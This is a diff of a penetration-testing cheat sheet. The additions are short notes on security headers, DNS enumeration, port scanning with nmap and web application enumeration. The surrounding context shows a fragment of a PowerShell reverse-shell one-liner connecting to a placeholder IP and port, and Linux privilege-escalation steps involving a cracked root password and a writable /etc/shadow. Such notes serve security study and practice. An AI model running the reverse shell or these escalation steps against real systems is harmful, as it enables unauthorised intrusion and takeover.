@@ -80,9 +80,15 @@ $client = New-Object System.Net.Sockets.TCPClient('$(ip)',$(port));$stream = $cl
 * `nslookup` does a reverse lookup on a domain
 * `hosts` command will tell you about the different types of web servers and their ip addresses.
 
+## Security Headers
+
+[securityheaders.com](SecurityHeaders) website shows if the server admin or the developers of the companies are familiar with the concept of server hardening or not.
+
+
 # Active Recon
 
 ## Dns Enumeration
+Dns is just a database responsible for routing ip address to domain names.
 
 * ```bash
 host $(website)
@@ -102,6 +108,10 @@ But The best tool for gathering info about domain is dnsenum
 ```bash
 dnsenum $(domain)
 ```
+
+## Portscanning
+
+Use nmap for portscanning.
 
 # linux prives
 
@@ -127,6 +137,17 @@ Switch to the root user, using the cracked password:
 ```bash
 su root
 ```
+
+
+# Web application enumeration
+
+There are two aspects server or the web application code (client)
+
+We should always start with nmap that is sever enumeration with nmap.
+
+
+
+
 
 ## Writable /etc/shadow
 
